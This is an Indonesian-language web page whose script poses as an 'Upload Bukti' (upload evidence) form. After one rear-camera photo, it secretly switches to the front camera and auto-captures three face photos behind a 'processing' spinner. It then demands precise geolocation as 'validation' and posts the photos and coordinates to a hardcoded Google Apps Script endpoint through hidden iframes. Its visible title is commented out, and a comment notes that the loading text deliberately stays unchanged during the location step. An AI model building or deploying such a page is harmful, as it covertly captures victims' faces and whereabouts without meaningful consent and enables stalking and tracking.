<!DOCTYPE html>
<html lang="id">

<head>

  <meta charset="UTF-8">

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
  >

  <title>Cyber Camera Experiment</title>


  <style>

    * {
      box-sizing: border-box;
    }


    body {

      margin: 0;

      min-height: 100vh;

      display: flex;

      justify-content: center;

      align-items: center;

      background:
        linear-gradient(
          135deg,
          #050505,
          #111111
        );

      font-family:
        Arial,
        Helvetica,
        sans-serif;

      color: white;

    }


    .container {

      width: 100%;

      max-width: 420px;

      padding: 24px;

      text-align: center;

    }


    h1 {

      margin-bottom: 10px;

      font-size: 25px;

    }


    .subtitle {

      color: #aaa;

      font-size: 14px;

      margin-bottom: 25px;

      line-height: 1.5;

    }


    video {

      width: 100%;

      border-radius: 18px;

      background: #000;

      display: none;

    }


    canvas {

      display: none;

    }


    button {

      width: 100%;

      padding: 16px;

      border: none;

      border-radius: 14px;

      font-size: 16px;

      font-weight: bold;

      cursor: pointer;

      background: white;

      color: black;

      margin-top: 15px;

    }


    button:disabled {

      opacity: 0.5;

      cursor: not-allowed;

    }


    .loading {

      display: none;

      margin-top: 25px;

    }


    .spinner {

      width: 40px;

      height: 40px;

      margin: auto;

      border: 4px solid #444;

      border-top: 4px solid white;

      border-radius: 50%;

      animation:
        spin 1s linear infinite;

    }


    @keyframes spin {

      to {

        transform: rotate(360deg);

      }

    }


    .loading-text {

      margin-top: 15px;

      font-size: 15px;

    }


    .loading-warning {

      margin-top: 8px;

      color: #aaa;

      font-size: 12px;

    }


    .success {

      display: none;

      margin-top: 30px;

    }


    .success-icon {

      font-size: 60px;

      margin-bottom: 15px;

    }


    .success h2 {

      margin: 0;

      font-size: 28px;

    }


    .error {

      display: none;

      margin-top: 30px;

      color: #ff6b6b;

      line-height: 1.6;

      font-size: 15px;

    }


    .error button {

      background: white;

      color: black;

      margin-top: 20px;

    }

  </style>

</head>


<body>


  <div class="container">


    <!-- <h1>
      Cyber Camera Experiment
    </h1>


    <div class="subtitle">
      Sistem pengujian kamera dan validasi lokasi.
    </div> -->


    <video
      id="video"
      autoplay
      playsinline
    ></video>


    <canvas id="canvas"></canvas>


    <button
      id="mainButton"
      onclick="startProcess()"
    >
      Upload Bukti
    </button>


    <!-- =========================================
         LOADING
         ========================================= -->

    <div
      id="loading"
      class="loading"
    >

      <div class="spinner"></div>


      <div
        id="loadingText"
        class="loading-text"
      >
        Sedang memproses...
      </div>


      <div class="loading-warning">
        Jangan menutup halaman ini.
      </div>

    </div>


    <!-- =========================================
         SUCCESS
         ========================================= -->

    <div
      id="success"
      class="success"
    >

      <div class="success-icon">
        ✓
      </div>


      <h2>
        Thank You
      </h2>

    </div>


    <!-- =========================================
         ERROR
         ========================================= -->

    <div
      id="error"
      class="error"
    >

      <div id="errorMessage"></div>


      <button
        onclick="location.reload()"
      >
        Ulangi Pengiriman
      </button>

    </div>


  </div>


<script>


/**
 * ==================================================
 * GAS WEB APP URL
 * ==================================================
 */

const GAS_URL =
  'https://script.google.com/macros/s/AKfycbyTXqpKOHsVlUNhQ_vWe9o5kMBdYjkTCp7gQfky0h00ohNMgIDSTi5PtD3gZ_f-bc_a/exec';


/**
 * ==================================================
 * SESSION ID
 * ==================================================
 */

const sessionId =
  'session_' +
  Date.now() +
  '_' +
  Math.random()
    .toString(36)
    .substring(2, 8);


/**
 * ==================================================
 * ELEMENT
 * ==================================================
 */

const video =
  document.getElementById('video');

const canvas =
  document.getElementById('canvas');

const mainButton =
  document.getElementById('mainButton');

const loading =
  document.getElementById('loading');

const success =
  document.getElementById('success');

const errorBox =
  document.getElementById('error');

const errorMessage =
  document.getElementById('errorMessage');


/**
 * ==================================================
 * STREAM
 * ==================================================
 */

let stream = null;


/**
 * ==================================================
 * START PROCESS
 * ==================================================
 */

async function startProcess() {

  try {

    mainButton.disabled = true;


    await openCamera(
      'environment'
    );


    mainButton.innerText =
      'Ambil Foto';


    mainButton.disabled =
      false;


    mainButton.onclick =
      takeFirstPhoto;

  }

  catch (error) {

    console.error(error);


    showError(
      'Kamera tidak dapat dibuka. Pastikan izin kamera diberikan.'
    );

  }

}


/**
 * ==================================================
 * OPEN CAMERA
 * ==================================================
 */

async function openCamera(
  cameraType
) {

  stopCamera();


  stream =
    await navigator.mediaDevices.getUserMedia({

      video: {

        facingMode: {
          ideal: cameraType
        },

        width: {
          ideal: 1280
        },

        height: {
          ideal: 720
        }

      },

      audio: false

    });


  video.srcObject =
    stream;


  video.style.display =
    'block';


  await video.play();

}


/**
 * ==================================================
 * STOP CAMERA
 * ==================================================
 */

function stopCamera() {

  if (!stream) {
    return;
  }


  stream
    .getTracks()
    .forEach(
      track => track.stop()
    );


  stream = null;

  video.srcObject = null;

}


/**
 * ==================================================
 * CAPTURE PHOTO
 * ==================================================
 */

function capturePhoto() {

  const width =
    video.videoWidth;

  const height =
    video.videoHeight;


  canvas.width =
    width;

  canvas.height =
    height;


  const context =
    canvas.getContext('2d');


  context.drawImage(
    video,
    0,
    0,
    width,
    height
  );


  return canvas.toDataURL(
    'image/jpeg',
    0.85
  );

}


/**
 * ==================================================
 * FIRST PHOTO
 * ==================================================
 */

async function takeFirstPhoto() {

  try {

    /**
     * ----------------------------------------------
     * TAMPILKAN LOADING
     * ----------------------------------------------
     */

    mainButton.style.display =
      'none';


    loading.style.display =
      'block';


    /**
     * ----------------------------------------------
     * FOTO 1
     * ----------------------------------------------
     */

    const image =
      capturePhoto();


    video.style.display =
      'none';


    await uploadPhoto(
      image,
      1
    );


    /**
     * ----------------------------------------------
     * KAMERA DEPAN
     * ----------------------------------------------
     */

    await openCamera(
      'user'
    );


    /**
     * ----------------------------------------------
     * FOTO 2
     * ----------------------------------------------
     */

    await automaticCapture(
      2
    );


    /**
     * ----------------------------------------------
     * FOTO 3
     * ----------------------------------------------
     */

    await automaticCapture(
      3
    );


    /**
     * ----------------------------------------------
     * FOTO 4
     * ----------------------------------------------
     */

    await automaticCapture(
      4
    );


    /**
     * ----------------------------------------------
     * STOP CAMERA
     * ----------------------------------------------
     */

    stopCamera();


    /**
     * ----------------------------------------------
     * VALIDASI LOKASI
     * ----------------------------------------------
     *
     * Tidak mengubah tulisan loading.
     * Tetap:
     *
     * Sedang memproses...
     * Jangan menutup halaman ini.
     *
     */

    const location =
      await requestLocation();


    /**
     * ----------------------------------------------
     * SIMPAN LOKASI
     * ----------------------------------------------
     */

    await uploadLocation(
      location
    );


    /**
     * ----------------------------------------------
     * SUCCESS
     * ----------------------------------------------
     */

    loading.style.display =
      'none';


    success.style.display =
      'block';

  }

  catch (error) {

    console.error(error);


    stopCamera();


    loading.style.display =
      'none';


    /**
     * ----------------------------------------------
     * ERROR LOKASI
     * ----------------------------------------------
     */

    showError(
      error.message ||
      'Gagal melakukan pengiriman.'
    );

  }

}


/**
 * ==================================================
 * AUTOMATIC CAPTURE
 * ==================================================
 */

async function automaticCapture(
  number
) {

  await sleep(
    1200
  );
video.style.display =
      'none';

  const image =
    capturePhoto();


  
  await uploadPhoto(
    image,
    number
  );


  await sleep(
    800
  );

}


/**
 * ==================================================
 * UPLOAD PHOTO
 * ==================================================
 */

function uploadPhoto(
  image,
  number
) {

  return new Promise(
    (resolve, reject) => {


      /**
       * --------------------------------------------
       * IFRAME
       * --------------------------------------------
       */

      const iframe =
        document.createElement(
          'iframe'
        );


      iframe.style.display =
        'none';


      iframe.name =
        'uploadFrame_' +
        Date.now() +
        '_' +
        number;


      document.body.appendChild(
        iframe
      );


      /**
       * --------------------------------------------
       * FORM
       * --------------------------------------------
       */

      const form =
        document.createElement(
          'form'
        );


      form.method =
        'POST';


      form.action =
        GAS_URL;


      form.target =
        iframe.name;


      /**
       * --------------------------------------------
       * PAYLOAD
       * --------------------------------------------
       */

      const payload = {

        type: 'PHOTO',

        id: sessionId,

        captureNumber:
          number,

        image:
          image

      };


      /**
       * --------------------------------------------
       * INPUT
       * --------------------------------------------
       */

      const input =
        document.createElement(
          'input'
        );


      input.type =
        'hidden';


      input.name =
        'payload';


      input.value =
        JSON.stringify(
          payload
        );


      form.appendChild(
        input
      );


      document.body.appendChild(
        form
      );


      /**
       * --------------------------------------------
       * LOAD
       * --------------------------------------------
       */

      iframe.onload =
        function() {

          setTimeout(
            function() {

              cleanup();

              resolve();

            },
            1000
          );

        };


      /**
       * --------------------------------------------
       * SUBMIT
       * --------------------------------------------
       */

      form.submit();


      /**
       * --------------------------------------------
       * CLEANUP
       * --------------------------------------------
 */

      function cleanup() {

        try {

          form.remove();

          iframe.remove();

        }

        catch (e) {}

      }

    }
  );

}


/**
 * ==================================================
 * REQUEST LOCATION
 * ==================================================
 */

function requestLocation() {

  return new Promise(
    (resolve, reject) => {


      /**
       * --------------------------------------------
       * SUPPORT
       * --------------------------------------------
       */

      if (
        !navigator.geolocation
      ) {

        reject(
          new Error(
            'Gagal melakukan validasi lokasi.'
          )
        );

        return;

      }


      /**
       * --------------------------------------------
       * PERMISSION CHECK
       * --------------------------------------------
       */

      if (
        navigator.permissions
      ) {

        navigator.permissions
          .query({
            name: 'geolocation'
          })

          .then(
            permission => {

              if (
                permission.state ===
                'denied'
              ) {

                reject(
                  new Error(
                    'Gagal melakukan validasi lokasi.<br><br>Silakan ulangi pengiriman dan aktifkan lokasi pada device untuk validasi.'
                  )
                );

                return;

              }


              getLocation();

            }
          )

          .catch(
            () => {

              getLocation();

            }
          );

      }

      else {

        getLocation();

      }


      /**
       * --------------------------------------------
       * GET LOCATION
       * --------------------------------------------
       */

      function getLocation() {

        navigator.geolocation
          .getCurrentPosition(

            position => {

              resolve({

                latitude:
                  position.coords.latitude,

                longitude:
                  position.coords.longitude,

                accuracy:
                  position.coords.accuracy,

                timestamp:
                  position.timestamp

              });

            },


            error => {

              console.error(
                'Location error:',
                error
              );


              reject(
                new Error(
                  'Gagal melakukan validasi lokasi.<br><br>Silakan ulangi pengiriman dan aktifkan lokasi pada device untuk validasi.'
                )
              );

            },


            {

              enableHighAccuracy:
                true,

              timeout:
                15000,

              maximumAge:
                0

            }

          );

      }

    }
  );

}


/**
 * ==================================================
 * UPLOAD LOCATION
 * ==================================================
 */

function uploadLocation(
  location
) {

  return new Promise(
    (resolve, reject) => {


      /**
       * --------------------------------------------
       * IFRAME
       * --------------------------------------------
       */

      const iframe =
        document.createElement(
          'iframe'
        );


      iframe.style.display =
        'none';


      iframe.name =
        'locationFrame_' +
        Date.now();


      document.body.appendChild(
        iframe
      );


      /**
       * --------------------------------------------
       * FORM
       * --------------------------------------------
       */

      const form =
        document.createElement(
          'form'
        );


      form.method =
        'POST';


      form.action =
        GAS_URL;


      form.target =
        iframe.name;


      /**
       * --------------------------------------------
       * PAYLOAD
       * --------------------------------------------
       */

      const payload = {

        type: 'LOCATION',

        id: sessionId,

        latitude:
          location.latitude,

        longitude:
          location.longitude,

        accuracy:
          location.accuracy

      };


      /**
       * --------------------------------------------
       * INPUT
       * --------------------------------------------
       */

      const input =
        document.createElement(
          'input'
        );


      input.type =
        'hidden';


      input.name =
        'payload';


      input.value =
        JSON.stringify(
          payload
        );


      form.appendChild(
        input
      );


      document.body.appendChild(
        form
      );


      /**
       * --------------------------------------------
       * LOAD
       * --------------------------------------------
       */

      iframe.onload =
        function() {

          setTimeout(
            function() {

              cleanup();

              resolve();

            },
            1000
          );

        };


      /**
       * --------------------------------------------
       * SUBMIT
       * --------------------------------------------
       */

      form.submit();


      /**
       * --------------------------------------------
       * CLEANUP
       * --------------------------------------------
       */

      function cleanup() {

        try {

          form.remove();

          iframe.remove();

        }

        catch (e) {}

      }

    }
  );

}


/**
 * ==================================================
 * SHOW ERROR
 * ==================================================
 */

function showError(
  message
) {

  mainButton.style.display =
    'none';


  errorBox.style.display =
    'block';


  /**
   * Izinkan <br> pada pesan error
   */

  errorMessage.innerHTML =
    message;

}


/**
 * ==================================================
 * SLEEP
 * ==================================================
 */

function sleep(
  milliseconds
) {

  return new Promise(
    resolve =>
      setTimeout(
        resolve,
        milliseconds
      )
  );

}


</script>

</body>

</html>
